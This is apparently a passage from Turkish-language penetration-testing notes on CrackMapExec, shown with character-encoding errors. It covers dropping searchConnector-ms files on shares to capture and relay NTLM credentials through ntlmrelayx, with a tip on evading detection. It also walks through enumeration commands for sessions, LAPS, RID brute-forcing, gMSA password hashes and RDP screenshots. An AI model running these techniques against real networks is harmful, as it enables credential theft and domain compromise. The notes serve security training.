Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

